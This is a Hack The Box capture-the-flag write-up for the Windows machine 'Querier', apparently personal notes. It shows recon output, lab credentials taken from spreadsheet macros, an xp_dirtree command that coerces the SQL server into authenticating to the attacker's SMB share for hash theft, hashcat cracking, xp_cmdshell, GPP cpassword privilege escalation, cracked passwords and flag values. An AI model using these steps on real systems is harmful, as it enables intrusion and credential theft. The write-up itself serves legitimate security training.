```json
Alias: Querier
Date: 20-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.236.237
```

# Querier
# Summary

- Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, PowerUp can be used to find Administrator credentials in a locally cached group policy file. 
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-20 14:39 PKT
Nmap scan report for 10.129.236.237
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-20T09:33:57
|_Not valid after:  2054-08-20T09:33:57
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2024-08-20T09:45:38+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-20T09:45:30
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 398.97 seconds
```

---
# Enumeration

We can access SMB with null session. Even though netexec doesn't work for some reason, we can list the shares with `smbclient` While providing the `-N` flag (It doesn't work if we give empty pass).

Anyways, we can access the reports share that has an excel file. The file is empty but if we look at the macros we will find this database connection string:
```
"Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

We can log in to  the database using these credentials

| Username  | Password         |
| --------- | ---------------- |
| reporting | PcwTWTHRwryjc$c6 |
`mssqlclient.py 'reporting:PcwTWTHRwryjc$c6@'$IP -windows-auth`


---

# Exploitation
Next we will setup a SMB Server and make the SQL Server connect back to us using:
`xp_dirtree \\$IP\share\test`


`hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`

| Username  | Password     |
| --------- | ------------ |
| mssql-svc | corporate568 |

And log in to SQL Server using this account to enable xp_cmdshell.

---
# Privilege Escalation

There are two ways of privesc. One is good old SeImpersonate Privilege that we can exploit with PrintSpoofer, The other we can find by running PowerUp.ps1. There is a cached Group Policy Preference With the encrypted `cpassword` that  PowerUp will crack for us giving us the credentials
of administrator.

| Username      | Password                     |
| ------------- | ---------------------------- |
| Administrator | MyUnclesAreMarioAndLuigi!!1! |

---

# Flags
- 603c419cce93f0094abde4df1fe02949
- 7681a3fc8bccfe799c870e321d874c60

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium #Windows #Windows/SeImpersonate #Windows/CredentialHunting #SQLi/MSSQL 